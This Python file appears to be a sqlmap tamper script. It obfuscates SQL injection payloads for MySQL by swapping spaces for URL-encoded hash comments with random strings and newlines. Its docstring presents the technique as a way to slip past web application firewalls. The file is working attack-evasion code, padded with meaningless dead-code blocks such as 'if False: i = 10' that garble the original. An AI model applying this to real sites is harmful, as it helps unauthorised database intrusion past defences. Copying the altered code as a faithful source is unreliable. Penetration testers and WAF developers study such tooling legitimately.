"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import os
import random
import re
import string
from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.settings import IGNORE_SPACE_AFFECTED_KEYWORDS
__priority__ = PRIORITY.LOW

def dependencies():
    if False:
        i = 10
        return i + 15
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s > 5.1.13" % (os.path.basename(__file__).split('.')[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if False:
        while True:
            i = 10
    "\n    Replaces (MySQL) instances of space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')\n\n    Requirement:\n        * MySQL >= 5.1.13\n\n    Tested against:\n        * MySQL 5.1.41\n\n    Notes:\n        * Useful to bypass several web application firewalls\n        * Used during the ModSecurity SQL injection challenge,\n          http://modsecurity.org/demo/challenge.html\n\n    >>> random.seed(0)\n    >>> tamper('1 AND 9227=9227')\n    '1%23RcDKhIr%0AAND%23upgPydUzKpMX%0A%23lgbaxYjWJ%0A9227=9227'\n    "

    def process(match):
        if False:
            return 10
        word = match.group('word')
        randomStr = ''.join((random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12))))
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, '%s%%23%s%%0A' % (word, randomStr))
        else:
            return match.group()
    retVal = ''
    if payload:
        payload = re.sub('(?<=\\W)(?P<word>[A-Za-z_]+)(?=\\W|\\Z)', process, payload)
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join((random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12))))
                retVal += '%%23%s%%0A' % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]
    return retVal